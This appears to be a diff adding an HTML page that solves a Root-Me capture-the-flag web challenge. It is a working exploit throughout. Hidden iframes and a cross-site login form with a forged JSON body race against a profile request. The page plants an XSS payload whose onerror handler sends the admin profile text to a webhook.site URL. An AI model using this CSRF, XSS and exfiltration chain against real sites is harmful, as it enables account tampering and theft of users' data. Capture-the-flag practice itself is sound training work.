@@ -1,0 +1,52 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Root-Me CTF Test</title>
+  </head>
+  <body>
+    <iframe name="prof" style="display: none"></iframe>
+    <iframe name="login" style="display: none"></iframe>
+
+    <script>
+      const TARGET = "https://web-client-ch6.challenge01.root-me.org:58006";
+
+      const HOOK = "https://webhook.site/e1570119-9fac-44ef-9e18-89981f7f7c07";
+
+      // Form untuk mengambil halaman profil admin
+      const profile = document.createElement("form");
+      profile.method = "GET";
+      profile.action = TARGET + "/profile";
+      profile.target = "prof";
+
+      document.body.appendChild(profile);
+
+      // Form untuk mengubah username sesi
+      const login = document.createElement("form");
+      login.method = "POST";
+      login.enctype = "text/plain";
+      login.action = TARGET + "/login";
+      login.target = "login";
+
+      const input = document.createElement("input");
+      input.type = "hidden";
+
+      const payload = `<img src=x onerror="location.href='${HOOK}?d='+encodeURIComponent(document.querySelector('#text').innerText)">`;
+
+      // Membentuk body JSON menggunakan enctype text/plain
+      input.name = `{"username":${JSON.stringify(payload)},"secret":"x","padding":"`;
+
+      input.value = '"}';
+
+      login.appendChild(input);
+      document.body.appendChild(login);
+
+      // Mulai race condition
+      profile.submit();
+
+      setTimeout(() => {
+        login.submit();
+      }, 60);
+    </script>
+  </body>
+</html>
